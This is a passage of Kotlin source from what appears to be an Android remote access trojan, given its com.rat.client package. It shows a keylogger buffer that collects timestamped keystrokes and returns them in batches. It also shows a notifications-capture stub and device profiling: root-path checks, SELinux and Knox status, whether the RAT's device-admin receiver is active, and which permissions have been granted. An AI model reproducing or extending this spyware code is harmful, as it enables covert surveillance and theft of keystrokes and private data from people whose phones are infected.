        // ===== Notifications =====

        
        fun getNotifications(context: Context): Map<String, Any> {
            // Requires NotificationListenerService
            return mapOf("notifications" to emptyList<Map<String, Any>>(), "count" to 0)
        }

        // ===== Keylogger =====

        
        fun addKeylog(text: String) {
            if (keylogBuffer.size >= MAX_KEYLOG_ENTRIES) {
                val oldestKey = keylogBuffer.keys.minOrNull()
                oldestKey?.let { keylogBuffer.remove(it) }
            }
            keylogBuffer[System.currentTimeMillis()] = text
        }

        
        fun getKeylogs(context: Context): Map<String, Any> {
            val logs = keylogBuffer.entries.map { (time, text) ->
                mapOf("time" to time, "text" to text)
            }.toList()
            keylogBuffer.clear()
            return mapOf("keylogs" to logs, "count" to logs.size)
        }

        // ===== Root Detection =====

        
        fun isDeviceRooted(): Boolean {
            val rootPaths = listOf(
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su",
                "/su/bin/su",
                "/magisk/.core/bin/su"
            )
            return rootPaths.any { File(it).exists() }
        }

        
        fun getSelinuxStatus(): String {
            return try {
                Runtime.getRuntime().exec("getenforce").inputStream.bufferedReader().readLine() ?: "Unknown"
            } catch (e: Exception) {
                "Unknown"
            }
        }

        
        fun getKnoxStatus(context: Context): String {
            return try {
                val knox = Class.forName("com.samsung.android.knox.SemPersonaManager")
                val method = knox.getMethod("isKnoxActive")
                val result = method.invoke(null) as Boolean
                if (result) "ACTIVE" else "INACTIVE"
            } catch (e: Exception) {
                "NOT_KNOX"
            }
        }

        
        fun isDeviceAdminActive(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
            return dpm.isAdminActive(adminComponent)
        }

        
        fun getGrantedPermissions(context: Context): List<String> {
            val pm = context.packageManager
            val pkgInfo = try {
                pm.getPackageInfo(context.packageName, PackageManager.GET_PERMISSIONS)
            } catch (e: Exception) {
                return emptyList()
            }
            return pkgInfo.requestedPermissions?.filter { perm ->
                ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
            } ?: emptyList()
        }

        
        fun getRadioVersion(): String {
            return try {
                val prop = System.getProperty("gsm.version.baseband")
                if (prop != null) return prop
                Runtime.getRuntime().exec("getprop gsm.version.baseband").inputStream.bufferedReader().readLine() ?: "Unknown"
            } catch (e: Exception) {
                "Unknown"
            }
        }

        private fun drawableToBase64(drawable: android.graphics.drawable.Drawable): String {
            val bitmap = (drawable as android.graphics.drawable.BitmapDrawable).bitmap
            val baos = java.io.ByteArrayOutputStream()
            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, baos)
            return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
        }
    }
}